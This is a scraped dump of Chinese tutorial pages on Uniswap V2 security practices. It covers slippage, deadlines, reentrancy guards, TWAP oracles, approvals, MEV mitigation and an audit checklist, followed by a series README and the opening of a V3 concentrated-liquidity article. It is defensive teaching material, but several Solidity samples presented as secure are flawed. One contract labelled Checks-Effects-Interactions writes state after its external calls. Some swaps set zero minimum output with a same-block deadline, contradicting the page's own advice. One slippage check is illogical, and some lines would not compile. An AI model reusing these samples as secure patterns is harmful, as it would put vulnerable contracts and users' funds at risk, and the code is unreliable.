paramsList.length; i++) {\n            amountsOut[i] = this.swapWithProtection(paramsList[i]);\n        }\n    }\n \n    /// @notice 动态滑点计算（根据波动率）\n    function calculateDynamicSlippage(\n        address tokenIn,\n        address tokenOut,\n        uint256 amountIn\n    ) external view returns (uint256 recommendedSlippage) {\n        // 获取储备量\n        address pair = _getPairAddress(tokenIn, tokenOut);\n        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();\n \n        // 计算交易规模占储备的比例\n        (uint256 reserveIn, uint256 reserveOut) = tokenIn &lt; tokenOut\n            ? (reserve0, reserve1)\n            : (reserve1, reserve0);\n \n        uint256 tradeRatio = (amountIn * 10000) / reserveIn;\n \n        // 根据交易规模动态调整滑点容忍度\n        if (tradeRatio &lt; 10) { // 小于0.1%\n            recommendedSlippage = 30; // 0.3%\n        } else if (tradeRatio &lt; 100) { // 0.1% - 1%\n            recommendedSlippage = 100; // 1%\n        } else if (tradeRatio &lt; 500) { // 1% - 5%\n            recommendedSlippage = 300; // 3%\n        } else { // 大于5%\n            recommendedSlippage = 500; // 5%\n        }\n    }\n \n    function _getPairAddress(address tokenA, address tokenB)\n        internal\n        view\n        returns (address)\n    {\n        return IUniswapV2Factory(router.factory()).getPair(tokenA, tokenB);\n    }\n}\n2.3 交易 deadline 保护\ncontract DeadlineProtectedTrader {\n    uint256 public constant MAX_DEADLINE_BUFFER = 1 hours;\n \n    /// @notice 带deadline的交换\n    function swapWithDeadline(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address recipient,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts) {\n        // 1. 验证deadline\n        require(\n            deadline &gt; block.timestamp,\n            &quot;Deadline must be in future&quot;\n        );\n \n        require(\n            deadline &lt;= block.timestamp + MAX_DEADLINE_BUFFER,\n            &quot;Deadline too far&quot;\n        );\n \n        // 2. 执行交易\n        // ...\n    }\n \n    /// @notice 自动计算合理的deadline\n    function getReasonableDeadline(uint256 extraTime)\n        external\n        view\n        returns (uint256)\n    {\n        require(\n            extraTime &lt;= MAX_DEADLINE_BUFFER,\n            &quot;Extra time too large&quot;\n        );\n \n        return block.timestamp + extraTime;\n    }\n}\n\n3. 重入攻击防护\n3.1 重入攻击原理\nstateDiagram-v2\n    [*] --&gt; Normal: 正常swap\n    Normal --&gt; Callback: uniswapV2Call\n    Callback --&gt; Reenter: 恶意合约再次调用swap\n    Reenter --&gt; Exploit: 破坏状态一致性\n    Exploit --&gt; [*]: 资金被盗\n\n    Callback --&gt; Normal: 正常返回\n    Normal --&gt; [*]: 交易完成\n\n3.2 Checks-Effects-Interactions 模式\ncontract SecureSwapContract {\n    using SafeERC20 for IERC20;\n \n    uint256 private locked = 1;\n \n    modifier lock() {\n        require(locked == 1, &quot;Reentrancy detected&quot;);\n        locked = 0;\n        _;\n        locked = 1;\n    }\n \n    mapping(address =&gt; uint256) public userBalances;\n \n    /// @notice 正确的交换模式\n    function swapAndDeposit(\n        uint256 amountIn,\n        address[] calldata path,\n        address recipient\n    ) external lock {\n        // 1. CHECKS: 验证输入\n        require(path.length &gt;= 2, &quot;Invalid path&quot;);\n        require(amountIn &gt; 0, &quot;Invalid amount&quot;);\n \n        // 2. EFFECTS: 更新状态\n        uint256 oldBalance = userBalances[recipient];\n \n        // 3. INTERACTIONS: 外部调用\n        IERC20(path[0]).safeTransferFrom(msg.sender, address(this), amountIn);\n        IERC20(path[0]).safeApprove(address(router), amountIn);\n \n        uint256[] memory amounts = router.swapExactTokensForTokens(\n            amountIn,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n \n        // 4. 再次更新状态（在所有外部调用之后）\n        userBalances[recipient] = oldBalance + amounts[amounts.length - 1];\n \n        // 5. 最后转账给用户\n        IERC20(path[path.length - 1]).safeTransfer(\n            recipient,\n            amounts[amounts.length - 1]\n        );\n    }\n}\n3.3 Reentrancy Guard\ncontract ReentrancyGuard {\n    uint256 private locked = 1;\n \n    modifier noReentrancy() {\n        require(locked == 1, &quot;Reentrancy detected&quot;);\n        locked = 0;\n        _;\n        locked = 1;\n    }\n \n    // 使用示例\n    function vulnerableFunction() external noReentrancy {\n        // 安全的代码\n    }\n}\n\n4. 价格操纵防护\n4.1 TWAP 安全使用\ncontract PriceManipulationResistant {\n    AdvancedTWAPOracle public oracle;\n \n    uint256 public constant MIN_TWAP_PERIOD = 1 hours;\n    uint256 public constant MAX_PRICE_DEVIATION = 300; // 3%\n \n    struct PriceCheck {\n        uint256 twapPrice;\n        uint256 spotPrice;\n        uint256 timestamp;\n        bool valid;\n    }\n \n    mapping(address =&gt; PriceCheck) public priceChecks;\n \n    /// @notice 安全的价格查询\n    function getSafePrice(\n        address tokenIn,\n        address tokenOut\n    ) external returns (uint256 price) {\n        // 1. 获取TWAP价格\n        (uint256 twapPrice, ) = oracle.consult(\n            _getPair(tokenIn, tokenOut),\n            MIN_TWAP_PERIOD\n        );\n \n        // 2. 获取即时价格\n        (uint256 spotPrice, ) = oracle.spotPrice(\n            _getPair(tokenIn, tokenOut)\n        );\n \n        // 3. 计算偏差\n        uint256 deviation = _calculateDeviation(spotPrice, twapPrice);\n \n        // 4. 如果偏差过大，使用TWAP价格\n        if (deviation &gt; MAX_PRICE_DEVIATION) {\n            emit PriceAnomaly Detected(tokenIn, tokenOut, twapPrice, spotPrice, deviation);\n            price = twapPrice;\n        } else {\n            // 可以使用两者的加权平均\n            price = (twapPrice * 7 + spotPrice * 3) / 10;\n        }\n \n        // 5. 记录价格检查\n        priceChecks[tokenIn] = PriceCheck({\n            twapPrice: twapPrice,\n            spotPrice: spotPrice,\n            timestamp: block.timestamp,\n            valid: true\n        });\n \n        return price;\n    }\n \n    function _calculateDeviation(\n        uint256 value1,\n        uint256 value2\n    ) internal pure returns (uint256 deviationBps) {\n        if (value1 &gt; value2) {\n            deviationBps = ((value1 - value2) * 10000) / value2;\n        } else {\n            deviationBps = ((value2 - value1) * 10000) / value2;\n        }\n    }\n \n    function _getPair(address tokenA, address tokenB)\n        internal\n        view\n        returns (address)\n    {\n        return IUniswapV2Factory(factory).getPair(tokenA, tokenB);\n    }\n \n    event PriceAnomalyDetected(\n        address indexed tokenIn,\n        address indexed tokenOut,\n        uint256 twapPrice,\n        uint256 spotPrice,\n        uint256 deviation\n    );\n}\n4.2 多数据源验证\ncontract MultiSourceOracle {\n    struct PriceSource {\n        address pair;\n        uint256 weight; // 权重\n        bool enabled;\n    }\n \n    mapping(address =&gt; PriceSource[]) public priceSources;\n \n    /// @notice 添加价格源\n    function addPriceSource(\n        address token,\n        address pair,\n        uint256 weight\n    ) external onlyOwner {\n        require(weight &lt;= 100, &quot;Weight too high&quot;);\n        priceSources[token].push(PriceSource({\n            pair: pair,\n            weight: weight,\n            enabled: true\n        }));\n    }\n \n    /// @notice 获取加权平均价格\n    function getWeightedPrice(address token)\n        external\n        view\n        returns (uint256 weightedPrice)\n    {\n        uint256 totalWeight;\n        uint256 weightedSum;\n \n        PriceSource[] memory sources = priceSources[token];\n \n        for (uint256 i = 0; i &lt; sources.length; i++) {\n            if (!sources[i].enabled) continue;\n \n            (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(sources[i].pair).getReserves();\n \n            uint256 price;\n            if (token &lt; IUniswapV2Pair(sources[i].pair).token1()) {\n                price = (uint256(reserve1) * 1e18) / reserve0;\n            } else {\n                price = (uint256(reserve0) * 1e18) / reserve1;\n            }\n \n            weightedSum += price * sources[i].weight;\n            totalWeight += sources[i].weight;\n        }\n \n        require(totalWeight &gt; 0, &quot;No enabled sources&quot;);\n        weightedPrice = weightedSum / totalWeight;\n    }\n}\n\n5. 授权安全\n5.1 授权最佳实践\ngraph TB\n    subgraph Approvals[\\&quot;授权策略\\&quot;]\n        A1[\\&quot;精确授权&lt;br/&gt;推荐\\&quot;]\n        A2[\\&quot;无限授权&lt;br/&gt;仅可信DApp\\&quot;]\n        A3[\\&quot;取消授权&lt;br/&gt;不再使用时\\&quot;]\n    end\n\n    subgraph Risks[\\&quot;风险等级\\&quot;]\n        R1[\\&quot;精确授权: 低\\&quot;]\n        R2[\\&quot;无限授权: 高\\&quot;]\n    end\n\n    Approvals --&gt; Risks\n\n    style A1 fill:#c8e6c9\n    style A2 fill:#ffcdd2\n\n5.2 安全授权管理器\ncontract SafeApprovalManager {\n    mapping(address =&gt; mapping(address =&gt; uint256)) public approvals;\n \n    event ApprovalSet(\n        address indexed owner,\n        address indexed spender,\n        uint256 amount\n    );\n \n    /// @notice 设置精确授权\n    function setApproval(\n        address token,\n        address spender,\n        uint256 amount\n    ) external {\n        IERC20(token).approve(spender, 0); // 先清除\n        IERC20(token).approve(spender, amount);\n \n        approvals[msg.sender][spender] = amount;\n \n        emit ApprovalSet(msg.sender, spender, amount);\n    }\n \n    /// @notice 增量授权\n    function increaseApproval(\n        address token,\n        address spender,\n        uint256 addedValue\n    ) external {\n        uint256 currentApproval = IERC20(token).allowance(msg.sender, spender);\n \n        IERC20(token).approve(spender, currentApproval + addedValue);\n        approvals[msg.sender][spender] = currentApproval + addedValue;\n \n        emit ApprovalSet(msg.sender, spender, currentApproval + addedValue);\n    }\n \n    /// @notice 减量授权\n    function decreaseApproval(\n        address token,\n        address spender,\n        uint256 subtractedValue\n    ) external {\n        uint256 currentApproval = IERC20(token).allowance(msg.sender, spender);\n \n        uint256 newApproval = currentApproval &gt; subtractedValue\n            ? currentApproval - subtractedValue\n            : 0;\n \n        IERC20(token).approve(spender, newApproval);\n        approvals[msg.sender][spender] = newApproval;\n \n        emit ApprovalSet(msg.sender, spender, newApproval);\n    }\n \n    /// @notice 撤销所有授权\n    function revokeAllApprovals(address token, address spender) external {\n        IERC20(token).approve(spender, 0);\n        approvals[msg.sender][spender] = 0;\n \n        emit ApprovalSet(msg.sender, spender, 0);\n    }\n \n    /// @notice 批量撤销授权\n    function revokeBatchApprovals(\n        address[] calldata tokens,\n        address[] calldata spenders\n    ) external {\n        require(tokens.length == spenders.length, &quot;Length mismatch&quot;);\n \n        for (uint256 i = 0; i &lt; tokens.length; i++) {\n            IERC20(tokens[i]).approve(spenders[i], 0);\n            approvals[msg.sender][spenders[i]] = 0;\n \n            emit ApprovalSet(msg.sender, spenders[i], 0);\n        }\n    }\n}\n5.3 Permit (EIP-2612) 支持\ncontract PermitTrader {\n    /// @notice 使用Permit进行无授权交易\n    function swapWithPermit(\n        address token,\n        uint256 amount,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s,\n        address[] calldata path,\n        address recipient\n    ) external returns (uint256[] memory amounts) {\n        // 1. 执行Permit签名验证并授权\n        IERC20Permit(token).permit(\n            msg.sender,\n            address(this),\n            amount,\n            deadline,\n            v,\n            r,\n            s\n        );\n \n        // 2. 转入代币\n        IERC20(token).transferFrom(msg.sender, address(this), amount);\n \n        // 3. 执行交易\n        IERC20(token).approve(address(router), amount);\n \n        amounts = router.swapExactTokensForTokens(\n            amount,\n            0,\n            path,\n            recipient,\n            block.timestamp\n        );\n    }\n}\n\n6. MEV 防护策略\n6.1 MEV 攻击类型\nmindmap\n  root((MEV攻击))\n    抢跑\n      复制交易参数\n      提高gas价格\n      优先执行\n    回跑\n      观察交易结果\n      在之后执行\n      从价格变化获利\n    三明治\n      抢跑+回跑组合\n      双向剥削用户\n    套利\n      利用价格差异\n      跨DEX套利\n\n6.2 私有内存池方案\nconcept[\\&quot;私有内存池方案\\&quot;] {\n    // 注意：这是概念性代码，实际需要与私有内存池服务集成\n \n    contract PrivateMempoolTrader {\n        address public trustedRelayer;\n \n        constructor(address _trustedRelayer) {\n            trustedRelayer = _trustedRelayer;\n        }\n \n        modifier onlyTrusted() {\n            require(msg.sender == trustedRelayer, &quot;Not trusted relayer&quot;);\n            _;\n        }\n \n        // 通过可信中继器提交交易\n        function submitPrivateSwap(\n            uint256 amountIn,\n            address[] calldata path,\n            bytes calldata encodedCall\n        ) external onlyTrusted {\n            // 直接执行，不经过公共内存池\n            (bool success, ) = address(router).call(encodedCall);\n            require(success, &quot;Swap failed&quot;);\n        }\n    }\n}\n6.3 时间平均执行\ncontract TimeAveragedTrader {\n    struct TradePlan {\n        uint256 totalAmount;\n        uint256 numTranches;\n        uint256 interval;\n        uint256 executedTranches;\n        uint256 lastExecutionTime;\n        address[] path;\n        address recipient;\n    }\n \n    mapping(bytes32 =&gt; TradePlan) public tradePlans;\n \n    event TradePlanCreated(bytes32 indexed planId, uint256 totalAmount, uint256 numTranches);\n    event TradeExecuted(bytes32 indexed planId, uint256 trancheAmount);\n \n    /// @notice 创建时间平均交易计划\n    function createTradePlan(\n        uint256 totalAmount,\n        uint256 numTranches,\n        uint256 interval,\n        address[] calldata path,\n        address recipient\n    ) external returns (bytes32) {\n        require(numTranches &gt; 0, &quot;Invalid tranches&quot;);\n        require(interval &gt;= 1 hours, &quot;Interval too short&quot;);\n \n        bytes32 planId = keccak256(abi.encodePacked(\n            msg.sender,\n            block.timestamp,\n            totalAmount\n        ));\n \n        tradePlans[planId] = TradePlan({\n            totalAmount: totalAmount,\n            numTranches: numTranches,\n            interval: interval,\n            executedTranches: 0,\n            lastExecutionTime: 0,\n            path: path,\n            recipient: recipient\n        });\n \n        emit TradePlanCreated(planId, totalAmount, numTranches);\n \n        return planId;\n    }\n \n    /// @notice 执行计划的下一笔交易\n    function executeNextTranche(bytes32 planId) external {\n        TradePlan storage plan = tradePlans[planId];\n \n        require(plan.executedTranches &lt; plan.numTranches, &quot;Plan completed&quot;);\n        require(\n            block.timestamp &gt;= plan.lastExecutionTime + plan.interval,\n            &quot;Too early&quot;\n        );\n \n        // 计算本笔交易数量\n        uint256 trancheAmount = plan.totalAmount / plan.numTranches;\n        uint256 remainingAmount = plan.totalAmount - (plan.totalAmount / plan.numTranches) * plan.executedTranches;\n \n        // 最后一笔使用剩余全部\n        if (plan.executedTranches == plan.numTranches - 1) {\n            trancheAmount = remainingAmount;\n        }\n \n        // 执行交易\n        IERC20(plan.path[0]).transferFrom(msg.sender, address(this), trancheAmount);\n        IERC20(plan.path[0]).approve(address(router), trancheAmount);\n \n        router.swapExactTokensForTokens(\n            trancheAmount,\n            0,\n            plan.path,\n            plan.recipient,\n            block.timestamp\n        );\n \n        plan.executedTranches++;\n        plan.lastExecutionTime = block.timestamp;\n \n        emit TradeExecuted(planId, trancheAmount);\n    }\n}\n\n7. 安全审计检查清单\n7.1 合约级别检查\nmindmap\n  root((安全审计))\n    访问控制\n      onlyOwner检查\n      角色权限划分\n      紧急暂停机制\n    状态管理\n      重入保护\n      整数溢出检查\n      状态一致性\n    外部调用\n      Checks-Effects-Interactions\n      低级调用安全\n      错误处理\n    业务逻辑\n      滑点保护\n      deadline验证\n      价格源验证\n\n7.2 审计检查清单\ncontract SecurityAuditChecklist {\n    // ============================================\n    // 1. 访问控制检查\n    // ============================================\n \n    address public owner;\n    mapping(address =&gt; bool) public admins;\n \n    modifier onlyOwner() {\n        require(msg.sender == owner, &quot;Not owner&quot;);\n        _;\n    }\n \n    modifier onlyAdmin() {\n        require(admins[msg.sender], &quot;Not admin&quot;);\n        _;\n    }\n \n    // ✅ CHECK: 所有敏感函数都有访问控制\n    function sensitiveFunction() external onlyOwner {\n        // 敏感操作\n    }\n \n    // ============================================\n    // 2. 重入保护检查\n    // ============================================\n \n    uint256 private locked = 1;\n \n    modifier noReentrancy() {\n        require(locked == 1, &quot;Reentrancy detected&quot;);\n        locked = 0;\n        _;\n        locked = 1;\n    }\n \n    // ✅ CHECK: 状态变更函数有重入保护\n    function stateChangingFunction() external noReentrancy {\n        // 状态变更操作\n    }\n \n    // ============================================\n    // 3. 滑点保护检查\n    // ============================================\n \n    // ✅ CHECK: 所有交换函数都有滑点保护\n    function swapWithSlippageProtection(\n        uint256 amountIn,\n        uint256 minAmountOut\n    ) external {\n        require(minAmountOut &gt; 0, &quot;Invalid min output&quot;);\n        require(minAmountOut &lt;= amountIn, &quot;Invalid slippage&quot;);\n \n        // 执行交换...\n    }\n \n    // ============================================\n    // 4. Deadline检查\n    // ============================================\n \n    // ✅ CHECK: 所有交换函数都有deadline\n    function swapWithDeadline(\n        uint256 deadline\n    ) external {\n        require(deadline &gt;= block.timestamp, &quot;Deadline expired&quot;);\n        require(deadline &lt;= block.timestamp + 1 hours, &quot;Deadline too far&quot;);\n \n        // 执行交换...\n    }\n \n    // ============================================\n    // 5. 安全的数学运算\n    // ============================================\n \n    // ✅ CHECK: 使用Solidity 0.8+的内置溢出检查\n    // 或者使用SafeMath库\n \n    function safeMath(uint256 a, uint256 b) external pure returns (uint256) {\n        return a + b; // Solidity 0.8+ 自动检查溢出\n    }\n \n    // ============================================\n    // 6. 安全的外部调用\n    // ============================================\n \n    // ✅ CHECK: 使用Checks-Effects-Interactions模式\n    function safeExternalCall(address target, bytes memory data)\n        external\n        noReentrancy\n    {\n        // 1. Checks\n        require(target != address(0), &quot;Invalid target&quot;);\n \n        // 2. Effects (更新状态)\n        // ...\n \n        // 3. Interactions (外部调用)\n        (bool success, bytes memory result) = target.call(data);\n        require(success, &quot;External call failed&quot;);\n    }\n \n    // ============================================\n    // 7. 紧急暂停机制\n    // ============================================\n \n    bool public paused;\n \n    modifier whenNotPaused() {\n        require(!paused, &quot;Contract is paused&quot;);\n        _;\n    }\n \n    function pause() external onlyOwner {\n        paused = true;\n    }\n \n    function unpause() external onlyOwner {\n        paused = false;\n    }\n \n    // ✅ CHECK: 关键函数有暂停保护\n    function criticalFunction() external whenNotPaused {\n        // 关键操作\n    }\n \n    // ============================================\n    // 8. 事件日志\n    // ============================================\n \n    // ✅ CHECK: 所有敏感操作都有事件日志\n    event SensitiveAction(\n        address indexed user,\n        uint256 value,\n        uint256 timestamp\n    );\n \n    function sensitiveAction(uint256 value) external {\n        // 执行操作\n        emit SensitiveAction(msg.sender, value, block.timestamp);\n    }\n}\n\n8. 开发最佳实践\n8.1 项目结构\nuniswap-v2-integration/\n├── contracts/\n│   ├── interfaces/\n│   │   ├── IUniswapV2Factory.sol\n│   │   ├── IUniswapV2Pair.sol\n│   │   ├── IUniswapV2Router02.sol\n│   │   └── IERC20Permit.sol\n│   ├── libraries/\n│   │   ├── UniswapV2Library.sol\n│   │   └── SafeERC20.sol\n│   ├── routers/\n│   │   └── OptimalRouter.sol\n│   └── oracles/\n│       └── SafeOracle.sol\n├── test/\n│   ├── unit/\n│   ├── integration/\n│   └── security/\n├── scripts/\n│   └── deploy/\n└── README.md\n\n8.2 测试策略\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n \nimport &quot;forge-std/Test.sol&quot;;\n \ncontract UniswapV2SecurityTest is Test {\n    IUniswapV2Router02 router;\n    IUniswapV2Factory factory;\n    IUniswapV2Pair pair;\n \n    address tokenA;\n    address tokenB;\n    address attacker;\n \n    function setUp() public {\n        // 设置测试环境\n        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n        factory = IUniswapV2Factory(router.factory());\n \n        tokenA = address(new TestToken(&quot;TokenA&quot;, &quot;TA&quot;, 18));\n        tokenB = address(new TestToken(&quot;TokenB&quot;, &quot;TB&quot;, 18));\n \n        attacker = address(0x1337);\n    }\n \n    // ============================================\n    // 安全测试用例\n    // ============================================\n \n    function testReentrancyProtection() public {\n        // 测试重入保护\n    }\n \n    function testSlippageProtection() public {\n        // 测试滑点保护\n    }\n \n    function testFlashLoanAttack() public {\n        // 测试闪电贷攻击防护\n    }\n \n    function testPriceManipulation() public {\n        // 测试价格操纵防护\n    }\n \n    function testMaxApprovalRisk() public {\n        // 测试无限授权风险\n    }\n}\n8.3 部署验证\n// deployment verification script\n \nfunction verifyDeployment(address routerAddress) external view returns (bool) {\n    IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);\n \n    // 1. 验证Factory地址\n    require(router.factory() != address(0), &quot;Invalid factory&quot;);\n \n    // 2. 验证WETH地址\n    require(router.WETH() != address(0), &quot;Invalid WETH&quot;);\n \n    // 3. 验证Router接口\n    try router.factory() {\n        // Factory调用成功\n    } catch {\n        revert(&quot;Router interface invalid&quot;);\n    }\n \n    return true;\n}\n\n9. 本章小结\n9.1 安全实践总结\nmindmap\n  root((V2安全实践))\n    滑点保护\n      设置最小输出\n      合理容忍度\n      deadline验证\n    重入防护\n      lock modifier\n      CEI模式\n      状态更新在外部调用前\n    价格安全\n      使用TWAP\n      多数据源验证\n      偏差检测\n    授权管理\n      精确授权\n      Permit支持\n      定期撤销\n    MEV防护\n      私有内存池\n      时间平均执行\n      随机策略\n\n9.2 安全建议清单\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n类别建议优先级滑点始终设置amountOutMin🔴 高Deadline设置合理的deadline🔴 高授权避免无限授权🟡 中测试编写完整测试用例🔴 高审计第三方安全审计🔴 高重入使用ReentrancyGuard🔴 高预言机使用TWAP而非即时价格🟡 中\n\n系列总结\n恭喜你完成了「死磕Uniswap V2」系列的全部学习！\n核心知识回顾\n\nV2概述与核心原理 - 恒定乘积AMM (x × y = k)\nFactory与Pair合约 - 合约结构与创建流程\n流动性与LP代币 - mint/burn与份额计算\n交换机制深度解析 - swap函数、滑点、Flash Swap\n价格预言机 - TWAP机制与防操纵\nRouter与路由 - 多跳交易与路径优化\n安全实践与最佳实践 - 漏洞防护与开发建议\n\n下一步学习建议\n\n深入学习 Uniswap V3 的集中流动性机制\n了解 Uniswap V4 的 Hooks 可编程性\n研究其他 AMM 变种 (Curve, Balancer)\n实践 DeFi 协议集成开发\n\n\n参考资料\n\nUniswap V2 Core Contracts\nUniswap V2 Periphery Contracts\nUniswap V2 Whitepaper\nSmart Contract Best Practices\nOpenZeppelin Security Audit Checklist\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/README":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/README","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/README.md","title":"README","links":[],"tags":[],"content":"死磕Uniswap V2\n\n深入解析Uniswap V2的核心技术与实现原理\n\n系列概述\n本系列文章深入剖析Uniswap V2的技术架构，从核心设计理念到实现细节，全面解析V2作为第二代AMM协议的技术创新。\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容状态01V2概述与核心原理恒定乘积AMM、核心公式📝02Factory与Pair合约合约结构、创建流程📝03流动性与LP代币mint/burn、份额计算📝04交换机制深度解析swap函数、滑点、Flash Swap📝05价格预言机TWAP、价格计算📝06Router与路由最佳路径、多跳交易📝07安全实践与最佳实践漏洞防护、开发建议📝\nV2 vs V1 核心差异\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性Uniswap V1Uniswap V2交易对ETH/ERC20ERC20/ERC20流动性单一池子多个独立池子Flash Swap❌✅价格预言机❌✅ TWAP协议费用0.3% 固定0.3% 可开关路由直接交易多跳路径\nV2 vs V3/V4 对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性V2V3V4流动性分布均匀(0,∞)可集中可集中+Hooks费用固定0.3%多档位动态可编程LP代币ERC20ERC721 NFTERC1155可选架构Factory模式Factory模式Singleton扩展性固定功能固定功能Hooks可编程\n核心创新点\n1. 恒定乘积AMM\nx × y = k\n\n\nx: Token0储备量\ny: Token1储备量\nk: 恒定乘积常数\n\n2. ERC20/ERC20交易\nV2支持任意两个ERC20代币之间的直接交易，无需通过ETH中转。\n3. Flash Swap\n无需抵押的闪电贷款，支持原子化套利和清算操作。\n4. TWAP预言机\n基于时间加权的平均价格，提供可靠的价格数据源。\n技术栈\n\nSolidity: ^0.6.0 (V2合约)\nFactory: UNISWAP_V2_FACTORY\nRouter: UNISWAP_V2_ROUTER_02\n标准: ERC20\n\n学习路径\n建议按顺序阅读本系列文章：\n\n入门: 先阅读「01-V2概述与核心原理」，理解AMM基础\n合约: 深入「02-Factory与Pair合约」，掌握核心合约\n流动性: 学习「03-流动性与LP代币」，了解LP机制\n交换: 深入「04-交换机制深度解析」，理解交易流程\n预言机: 掌握「05-价格预言机」，了解TWAP原理\n路由: 学习「06-Router与路由」，掌握多跳交易\n实践: 阅读「07-安全实践」，确保开发安全\n\n参考资料\n\nUniswap V2 Whitepaper\nUniswap V2 Core Code\nUniswap V2 Periphery\nERC-20 Token Standard\n\n贡献\n欢迎提交Issue和Pull Request来完善本系列文档。\n许可证\nMIT License"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/01-概述与集中流动性":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/01-概述与集中流动性","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/01-概述与集中流动性.md","title":"01-概述与集中流动性","links":[],"tags":[],"content":"死磕Uniswap V3（一）：概述与集中流动性\n\n本文是「死磕Uniswap V3」系列的第一篇，将深入探讨V3的革命性创新——集中流动性机制。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01概述与集中流动性AMM演进、集中流动性原理02Tick机制与价格数学Tick设计、价格转换算法03架构与合约设计Factory、Pool合约结构04交换机制深度解析swap函数、价格发现05流动性管理与头寸Position、mint/burn06费用系统与预言机费用分配、TWAP07MEV与套利策略JIT、三明治攻击\n\n1. AMM的技术演进\n1.1 从V1到V3的革命之路\nUniswap的发展历程代表了DeFi领域自动化做市商（AMM）技术的演进史：\nflowchart LR\n    subgraph V1[&quot;Uniswap V1&quot;]\n        A1[ETH-ERC20配对]\n        A2[恒定乘积公式]\n        A3[基础流动性池]\n    end\n\n    subgraph V2[&quot;Uniswap V2&quot;]\n        B1[任意ERC20配对]\n        B2[Flash Swap]\n        B3[价格预言机]\n        B4[协议费用机制]\n    end\n\n    subgraph V3[&quot;Uniswap V3&quot;]\n        C1[集中流动性]\n        C2[多级费用]\n        C3[NFT LP Token]\n        C4[高级预言机]\n        C5[范围订单]\n    end\n\n    V1 --&gt;|2020年| V2\n    V2 --&gt;|2021年| V3\n\n    style V3 fill:#e1f5fe\n\n1.2 第一代AMM的局限性\n传统AMM基于恒定乘积公式 x × y = k，存在根本性缺陷：\ngraph TD\n    subgraph TraditionalAMMProblems[&quot;传统AMM问题&quot;]\n        P1[流动性均匀分布在&lt;br/&gt;0到∞的价格范围]\n        P2[大部分流动性&lt;br/&gt;永远不会被使用]\n        P3[资本利用率&lt;br/&gt;仅1-5%]\n        P4[LP无法控制&lt;br/&gt;价格暴露区间]\n    end\n\n    P1 --&gt; R1[资本效率极低]\n    P2 --&gt; R1\n    P3 --&gt; R2[收益率受限]\n    P4 --&gt; R3[被动承担风险]\n\n    style R1 fill:#ffcdd2\n    style R2 fill:#ffcdd2\n    style R3 fill:#ffcdd2\n\n资本利用率问题示例：\n假设ETH/USDC交易对，当前价格为2000 USDC/ETH：\n\n在传统AMM中，流动性分布在价格区间 [0, ∞]\n但90%的交易发生在 [1800, 2200] 价格区间\n这意味着大约10%的流动性在处理90%的交易量\n\n\n2. 集中流动性：V3的核心创新\n2.1 什么是集中流动性？\n集中流动性允许流动性提供者（LP）将资金集中在自定义的价格区间内，而不是分散在整个价格曲线上。\ngraph TB\n    subgraph TraditionalAMM[&quot;传统AMM流动性分布&quot;]\n        T1[&quot;价格区间: [0, ∞]&quot;]\n        T2[&quot;流动性均匀分布&quot;]\n        T3[&quot;大部分资金闲置&quot;]\n    end\n\n    subgraph V3AMM[&quot;Uniswap V3 集中流动性&quot;]\n        V1[&quot;自定义价格区间&lt;br/&gt;[Pa, Pb]&quot;]\n        V2[&quot;流动性高度集中&quot;]\n        V3[&quot;资本效率提升&lt;br/&gt;最高4000倍&quot;]\n    end\n\n    TraditionalAMM --&gt;|革新| V3AMM\n\n    style V3AMM fill:#c8e6c9\n\n2.2 集中流动性的数学基础\n传统公式 vs 集中流动性公式\n传统恒定乘积公式：\nx × y = k\n\n集中流动性公式（在价格区间 [Pa, Pb] 内）：\n(x + L/√Pb) × (y + L×√Pa) = L²\n\n其中：\n\nL: 流动性常数（Liquidity）\nPa: 价格区间下界\nPb: 价格区间上界\nx, y: 代币的虚拟储备量\n\ngraph LR\n    subgraph 公式组成\n        L[&quot;L: 流动性常数&quot;]\n        Pa[&quot;Pa: 价格下界&quot;]\n        Pb[&quot;Pb: 价格上界&quot;]\n        X[&quot;x: token0虚拟储备&quot;]\n        Y[&quot;y: token1虚拟储备&quot;]\n    end\n\n    subgraph 核心关系\n        F[&quot;(x + L/√Pb) × (y + L×√Pa) = L²&quot;]\n    end\n\n    L --&gt; F\n    Pa --&gt; F\n    Pb --&gt; F\n    X --&gt; F\n    Y --&gt; F\n\n2.3 虚拟储备的概念\n集中流动性引入了”虚拟储备”概念，这是理解V3的关键：\nflowchart TB\n    subgraph 虚拟储备计算[&quot;虚拟储备计算&quot;]\n        XV[&quot;x_virtual = L / √Pb&lt;br/&gt;（价格上界的虚拟token0）&quot;]\n        YV[&quot;y_virtual = L × √Pa&lt;br/&gt;（价格下界的虚拟token1）&quot;]\n    end\n\n    subgraph 物理意义\n        M1[&quot;使区间内交易&lt;br/&gt;表现如传统AMM&quot;]\n        M2[&quot;价格超出区间时&lt;br/&gt;流动性自动失效&quot;]\n        